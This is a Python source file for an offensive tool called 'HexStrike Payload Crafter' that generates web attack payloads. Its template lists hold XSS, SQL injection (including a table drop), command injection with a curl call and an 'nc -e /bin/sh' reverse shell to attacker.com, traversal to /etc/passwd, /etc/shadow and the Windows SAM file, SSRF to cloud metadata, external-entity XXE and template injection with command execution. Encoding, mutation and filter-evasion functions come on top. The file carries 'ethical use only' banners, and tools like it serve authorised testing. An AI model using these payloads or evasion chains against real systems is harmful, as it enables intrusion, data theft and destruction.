"""
BAEL HexStrike Payload Crafter
===============================

Create security testing payloads.
Supports encoding, obfuscation, and evasion.

⚠️ ETHICAL USE ONLY ⚠️
For authorized security testing only.

Features:
- Multi-format payloads
- Encoding chains
- Evasion techniques
- Custom payload creation
- Payload mutation
"""

import base64
import hashlib
import logging
import urllib.parse
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Any, Callable, Dict, List, Optional

logger = logging.getLogger(__name__)


class PayloadType(Enum):
    """Payload types."""
    XSS = "xss"
    SQLI = "sqli"
    CMD = "cmd"
    TRAVERSAL = "traversal"
    SSRF = "ssrf"
    XXE = "xxe"
    SSTI = "ssti"
    CUSTOM = "custom"


class EncodingStrategy(Enum):
    """Encoding strategies."""
    NONE = "none"
    URL = "url"
    DOUBLE_URL = "double_url"
    BASE64 = "base64"
    HTML = "html"
    UNICODE = "unicode"
    HEX = "hex"
    MIXED = "mixed"


@dataclass
class PayloadVariant:
    """A payload variant."""
    payload: str
    encoding: EncodingStrategy
    description: str = ""
    success_likelihood: float = 0.5


@dataclass
class Payload:
    """A crafted payload."""
    id: str
    name: str
    payload_type: PayloadType

    # Base payload
    base_payload: str

    # Variants
    variants: List[PayloadVariant] = field(default_factory=list)

    # Metadata
    description: str = ""
    target_context: str = ""  # html, attribute, script, url, etc.

    created_at: datetime = field(default_factory=datetime.now)


class PayloadCrafter:
    """
    Payload crafting system for HexStrike.

    ⚠️ ETHICAL USE ONLY ⚠️
    """

    def __init__(self):
        # Payload templates
        self.templates: Dict[PayloadType, List[str]] = {}
        self._load_templates()

        # Encoders
        self._encoders: Dict[EncodingStrategy, Callable[[str], str]] = {
            EncodingStrategy.NONE: lambda x: x,
            EncodingStrategy.URL: self._url_encode,
            EncodingStrategy.DOUBLE_URL: self._double_url_encode,
            EncodingStrategy.BASE64: self._base64_encode,
            EncodingStrategy.HTML: self._html_encode,
            EncodingStrategy.UNICODE: self._unicode_encode,
            EncodingStrategy.HEX: self._hex_encode,
        }

        # Generated payloads
        self.payloads: Dict[str, Payload] = {}

        # Stats
        self.stats = {
            "payloads_crafted": 0,
            "variants_generated": 0,
        }

    def _load_templates(self) -> None:
        """Load payload templates."""
        # XSS payloads
        self.templates[PayloadType.XSS] = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "javascript:alert(1)",
            "'><script>alert(1)</script>",
            "\"><script>alert(1)</script>",
            "<img src=x onerror='alert(1)'>",
            "<svg/onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<marquee onstart=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<math><maction actiontype=\"statusline#http://google.com\"xlink:href=\"javascript:alert(1)\">",
        ]

        # SQL Injection payloads
        self.templates[PayloadType.SQLI] = [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR '1'='1'/*",
            "1' ORDER BY 1--",
            "1' UNION SELECT NULL--",
            "1' UNION SELECT NULL,NULL--",
            "1' AND SLEEP(5)--",
            "1'; DROP TABLE users--",
            "admin'--",
            "' OR 1=1#",
            "1' AND '1'='1",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        ]

        # Command Injection payloads
        self.templates[PayloadType.CMD] = [
            "; id",
            "| id",
            "$(id)",
            "`id`",
            "; ls -la",
            "| cat /etc/passwd",
            "&& id",
            "|| id",
            "; sleep 5",
            "| sleep 5",
            "$(sleep 5)",
            "; curl http://attacker.com",
            "| nc -e /bin/sh attacker.com 4444",
        ]

        # Path Traversal payloads
        self.templates[PayloadType.TRAVERSAL] = [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "../../../../../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "....//....//....//etc/shadow",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
        ]

        # SSRF payloads
        self.templates[PayloadType.SSRF] = [
            "http://127.0.0.1",
            "http://localhost",
            "http://[::1]",
            "http://169.254.169.254/latest/meta-data/",
            "http://0177.0.0.1",
            "http://0x7f.0.0.1",
            "http://127.1",
            "file:///etc/passwd",
            "dict://127.0.0.1:6379/info",
            "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a",
        ]

        # XXE payloads
        self.templates[PayloadType.XXE] = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>',
        ]

        # SSTI payloads
        self.templates[PayloadType.SSTI] = [
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "<%= 7*7 %>",
            "{{config}}",
            "{{self.__init__.__globals__}}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
        ]

    def _url_encode(self, payload: str) -> str:
        """URL encode payload."""
        return urllib.parse.quote(payload, safe="")

    def _double_url_encode(self, payload: str) -> str:
        """Double URL encode payload."""
        return urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")

    def _base64_encode(self, payload: str) -> str:
        """Base64 encode payload."""
        return base64.b64encode(payload.encode()).decode()

    def _html_encode(self, payload: str) -> str:
        """HTML entity encode payload."""
        result = ""
        for char in payload:
            result += f"&#{ord(char)};"
        return result

    def _unicode_encode(self, payload: str) -> str:
        """Unicode escape encoding."""
        result = ""
        for char in payload:
            if ord(char) > 127 or char in "<>'\"&":
                result += f"\\u{ord(char):04x}"
            else:
                result += char
        return result

    def _hex_encode(self, payload: str) -> str:
        """Hex encode payload."""
        return payload.encode().hex()

    def craft(
        self,
        payload_type: PayloadType,
        context: str = "",
        encodings: Optional[List[EncodingStrategy]] = None,
        custom_payload: Optional[str] = None,
    ) -> Payload:
        """
        Craft a payload with variants.

        Args:
            payload_type: Type of payload
            context: Target context (html, url, etc.)
            encodings: Encoding strategies to apply
            custom_payload: Custom base payload

        Returns:
            Crafted payload
        """
        self.stats["payloads_crafted"] += 1

        payload_id = hashlib.md5(
            f"{payload_type}:{datetime.now()}".encode()
        ).hexdigest()[:12]

        # Get base payloads
        if custom_payload:
            base_payloads = [custom_payload]
        else:
            base_payloads = self.templates.get(payload_type, [])[:5]

        # Default encodings
        if not encodings:
            encodings = [
                EncodingStrategy.NONE,
                EncodingStrategy.URL,
                EncodingStrategy.HTML,
            ]

        # Generate variants
        variants = []
        for base in base_payloads:
            for encoding in encodings:
                try:
                    encoded = self._encoders[encoding](base)
                    variants.append(PayloadVariant(
                        payload=encoded,
                        encoding=encoding,
                        description=f"{payload_type.value} - {encoding.value}",
                        success_likelihood=self._estimate_success(encoding, context),
                    ))
                    self.stats["variants_generated"] += 1
                except Exception as e:
                    logger.debug(f"Encoding error: {e}")

        payload = Payload(
            id=payload_id,
            name=f"{payload_type.value} Payload",
            payload_type=payload_type,
            base_payload=base_payloads[0] if base_payloads else "",
            variants=variants,
            description=f"Crafted {payload_type.value} payload with {len(variants)} variants",
            target_context=context,
        )

        self.payloads[payload_id] = payload

        logger.info(f"Crafted payload: {payload.name} ({len(variants)} variants)")

        return payload

    def _estimate_success(
        self,
        encoding: EncodingStrategy,
        context: str,
    ) -> float:
        """Estimate payload success likelihood."""
        base_score = 0.5

        # Context-based adjustments
        if context == "url" and encoding in (EncodingStrategy.URL, EncodingStrategy.DOUBLE_URL):
            base_score += 0.2
        if context == "html" and encoding == EncodingStrategy.HTML:
            base_score += 0.2
        if encoding == EncodingStrategy.NONE:
            base_score -= 0.1  # Less likely to bypass filters

        return min(1.0, max(0.1, base_score))

    def mutate(
        self,
        payload: str,
        mutations: int = 5,
    ) -> List[str]:
        """
        Generate payload mutations.

        Args:
            payload: Base payload
            mutations: Number of mutations

        Returns:
            List of mutated payloads
        """
        mutated = []

        # Case variations
        mutated.append(payload.upper())
        mutated.append(payload.lower())
        mutated.append(payload.swapcase())

        # Whitespace variations
        mutated.append(payload.replace(" ", "\t"))
        mutated.append(payload.replace(" ", "  "))
        mutated.append(payload.replace(" ", "/**/"))

        # Comment injection (SQL)
        mutated.append(payload.replace(" ", "/*comment*/"))

        # Null byte injection
        mutated.append(payload + "\x00")

        # Unicode normalization bypass
        mutated.append(payload.replace("a", "\uff41"))  # Fullwidth 'a'

        return mutated[:mutations]

    def chain_encodings(
        self,
        payload: str,
        encodings: List[EncodingStrategy],
    ) -> str:
        """
        Apply encoding chain.

        Args:
            payload: Base payload
            encodings: Encoding chain to apply

        Returns:
            Chain-encoded payload
        """
        result = payload

        for encoding in encodings:
            if encoding in self._encoders:
                result = self._encoders[encoding](result)

        return result

    def get_all_for_type(
        self,
        payload_type: PayloadType,
    ) -> List[str]:
        """Get all payloads for a type."""
        return self.templates.get(payload_type, [])

    def add_template(
        self,
        payload_type: PayloadType,
        payload: str,
    ) -> None:
        """Add custom payload template."""
        if payload_type not in self.templates:
            self.templates[payload_type] = []
        self.templates[payload_type].append(payload)

    def get_evasion_payloads(
        self,
        payload_type: PayloadType,
    ) -> List[PayloadVariant]:
        """Get WAF/filter evasion payloads."""
        evasion_variants = []
        base_payloads = self.templates.get(payload_type, [])[:3]

        evasion_encodings = [
            EncodingStrategy.DOUBLE_URL,
            EncodingStrategy.UNICODE,
            EncodingStrategy.MIXED,
        ]

        for base in base_payloads:
            for encoding in evasion_encodings:
                if encoding == EncodingStrategy.MIXED:
                    # Apply multiple encodings
                    encoded = self.chain_encodings(base, [
                        EncodingStrategy.URL,
                        EncodingStrategy.HTML,
                    ])
                else:
                    encoded = self._encoders.get(encoding, lambda x: x)(base)

                evasion_variants.append(PayloadVariant(
                    payload=encoded,
                    encoding=encoding,
                    description=f"Evasion: {encoding.value}",
                    success_likelihood=0.7,
                ))

        return evasion_variants

    def get_stats(self) -> Dict[str, Any]:
        """Get crafter statistics."""
        return {
            **self.stats,
            "templates_count": sum(len(v) for v in self.templates.values()),
            "stored_payloads": len(self.payloads),
        }


def demo():
    """Demonstrate payload crafter."""
    print("=" * 60)
    print("BAEL HexStrike Payload Crafter Demo")
    print("⚠️  ETHICAL USE ONLY ⚠️")
    print("=" * 60)

    crafter = PayloadCrafter()

    # Craft XSS payloads
    xss_payload = crafter.craft(
        PayloadType.XSS,
        context="html",
        encodings=[
            EncodingStrategy.NONE,
            EncodingStrategy.URL,
            EncodingStrategy.HTML,
            EncodingStrategy.UNICODE,
        ],
    )

    print(f"\nCrafted XSS Payload:")
    print(f"  ID: {xss_payload.id}")
    print(f"  Variants: {len(xss_payload.variants)}")

    print(f"\nVariant samples:")
    for variant in xss_payload.variants[:5]:
        print(f"  [{variant.encoding.value}] {variant.payload[:60]}...")

    # Mutate payload
    mutations = crafter.mutate("<script>alert(1)</script>")
    print(f"\nMutations ({len(mutations)}):")
    for mut in mutations[:3]:
        print(f"  {mut[:50]}...")

    # Get evasion payloads
    evasion = crafter.get_evasion_payloads(PayloadType.SQLI)
    print(f"\nEvasion payloads: {len(evasion)}")

    # Chain encodings
    chained = crafter.chain_encodings(
        "' OR '1'='1",
        [EncodingStrategy.URL, EncodingStrategy.BASE64],
    )
    print(f"\nChained encoding: {chained[:50]}...")

    print(f"\nStats: {crafter.get_stats()}")


if __name__ == "__main__":
    demo()
